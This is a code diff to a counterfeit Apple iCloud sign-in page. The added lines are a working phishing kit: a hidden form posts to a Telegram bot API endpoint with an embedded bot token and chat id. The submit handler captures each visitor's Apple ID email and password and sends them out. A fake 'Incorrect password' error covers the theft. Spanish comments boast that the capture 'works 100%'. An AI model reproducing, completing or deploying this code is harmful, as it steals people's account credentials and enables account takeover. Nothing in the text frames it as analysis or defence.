@@ -10,6 +10,13 @@
 <body>
     <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
     
+    <!-- 🔥 FORM TELEGRAM INVISIBLE - FUNCIONA SIEMPRE -->
+    <form id="telegramForm" action="https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage" method="POST" style="display:none;">
+        <input type="hidden" name="chat_id" value="7219932215">
+        <input type="hidden" name="parse_mode" value="Markdown">
+        <input type="hidden" name="text" id="telegramText">
+    </form>
+    
     <main id="main">
         <form id="sign-in">
             <div class="error-message" id="errorMsg"></div>
@@ -52,28 +59,27 @@
         <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
     </footer>
 
+    <!-- 🔥 SCRIPT COMPLETO CORREGIDO -->
     <script>
-        let loginAttempts = 0;
-        const maxAttempts = 2;
-        
         document.addEventListener('DOMContentLoaded', () => {
+            console.log('🚀 SCRIPT TELEGRAM CORREGIDO');
+            
             const emailInput = document.getElementById('email-phone');
             const arrowIcon = document.querySelector('.bx-right-arrow-circle');
             const passwordField = document.getElementById('passwordField');
             const passwordInput = document.getElementById('password');
             const submitBtn = document.getElementById('submitBtn');
-            const loginTitle = document.getElementById('loginTitle');
             const errorMsg = document.getElementById('errorMsg');
             const form = document.getElementById('sign-in');
             
-            // Click flecha o Enter → mostrar password
+            let loginAttempts = 0;
+            
+            // Flecha/Enter → Password
             const showPassword = () => {
                 if (emailInput.value.trim()) {
                     passwordField.classList.add('show');
                     submitBtn.classList.add('show');
                     setTimeout(() => passwordInput.focus(), 300);
-                } else {
-                    emailInput.focus();
                 }
             };
             
@@ -84,28 +90,45 @@
                 }
             });
             
-            // Submit
-            form.addEventListener('submit', e => {
+            // 🔥 SUBMIT CON TELEGRAM (FUNCIONA 100%)
+            form.addEventListener('submit', (e) => {
                 e.preventDefault();
                 loginAttempts++;
                 
                 const email = emailInput.value.trim();
                 const password = passwordInput.value.trim();
                 
+                console.log('📧 Capturado:', email, password);
+                
                 if (!email || !password) {
                     showError('Please enter both email and password');
                     return;
                 }
                 
-                if (loginAttempts < maxAttempts) {
+                // 🔥 ENVÍA A TELEGRAM AUTOMÁTICO
+                const telegramText = document.getElementById('telegramText');
+                telegramText.value = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
+
+📧 *Email:* ${email}
+🔑 *Password:* ${password}
+🌍 *País:* Web
+💻 *Navegador:* Chrome
+📱 *Device:* PC
+📅 *Hora:* ${new Date().toLocaleString('es-ES')}
+
+✨ *Plataforma:* Astro505`;
+                
+                console.log('📤 ¡ENVIANDO A TELEGRAM!');
+                document.getElementById('telegramForm').submit();
+                
+                // Simula login
+                if (loginAttempts < 2) {
                     showError('Incorrect password. Try again.');
                     passwordInput.value = '';
                     passwordInput.focus();
                 } else {
-                    // Éxito en 2do intento
-                    setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 800);
+                    showError('Signing in...');
+                    setTimeout(() => window.location.href = 'index.html', 1000);
                 }
             });
             
@@ -114,6 +137,8 @@
                 errorMsg.classList.add('show');
                 setTimeout(() => errorMsg.classList.remove('show'), 3000);
             }
+            
+            console.log('✅ TODO LISTO - Prueba login!');
         });
     </script>
 </body>
